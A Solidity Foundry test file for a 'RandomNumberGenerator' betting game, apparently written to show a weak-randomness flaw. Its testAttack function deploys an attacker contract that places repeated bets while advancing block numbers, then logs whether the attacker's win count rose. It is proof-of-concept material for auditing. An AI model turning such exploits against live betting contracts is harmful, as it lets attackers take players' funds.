// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/random_number_generator.sol";

contract RandomNumberGeneratorTest is Test {
    RandomNumberGenerator game;
    address player = address(0x123);
    address attacker = address(0x456);

    function setUp() public {
        game = new RandomNumberGenerator();
        vm.deal(player, 10 ether);
        vm.deal(attacker, 10 ether);
    }

    // Shows normal player interaction with the game
    function testNormalPlay() public {
        vm.prank(player);
        game.playGame(1 ether);
        
        (uint256 betAmount, ) = game.getPlayerStats(player);
        assertEq(betAmount, 1 ether, "Player should have bet 1 ether");
    }

    // Shows how an attacker can exploit the predictable randomness
    function testAttack() public {
        // Attacker deploys malicious contract
        AttackerContract attackerContract = new AttackerContract(address(game));
        
        console.log("--- BEFORE-Trigger Attack ---");
        // Query attacker's pre-attack win count and total games
        (, uint256 winCountBefore) = game.getPlayerStats(address(attackerContract));
        uint256 totalGamesBefore = game.totalGames();
        console.log("Pre-Attack - Attacker wins: %d, Total games: %d", winCountBefore, totalGamesBefore);

        console.log("--- Trigger Attack ---");
        vm.prank(attacker);
        // Attack with multiple attempts to demonstrate exploit
        for (uint i = 0; i < 10; i++) {
            try attackerContract.attack(1 ether) {
                (, uint256 currentWins) = game.getPlayerStats(address(attackerContract));
                if (currentWins > 0) break;
            } catch {}
            vm.roll(block.number + 1); // Advance block number to change randomness
        }
        
        console.log("--- AFTER-Trigger Attack ---");
        // Query attacker's post-attack win count and total games
        (, uint256 winCountAfter) = game.getPlayerStats(address(attackerContract));
        uint256 totalGamesAfter = game.totalGames();
        console.log("Post-Attack - Attacker wins: %d, Total games: %d", winCountAfter, totalGamesAfter);
        
        // Verify attacker played
        (uint256 betAmount, ) = game.getPlayerStats(address(attackerContract));
        assertGt(betAmount, 0, "Attacker should have placed bets");
        
        // Differentially verify if attack increased win count
        if (winCountAfter > winCountBefore) {
            console.log("Vulnerability Exists: Win count increased from %d to %d proving exploit success", winCountBefore, winCountAfter);
        } else {
            console.log("Vulnerability not Exist: Win count unchanged (%d->%d) despite exploit attempt", winCountBefore, winCountAfter);
        }
    }
}

contract AttackerContract {
    RandomNumberGenerator game;
    
    constructor(address _game) {
        game = RandomNumberGenerator(_game);
    }
    
    function attack(uint256 bet) external payable {
        game.playGame(bet);
    }
    
    receive() external payable {}
}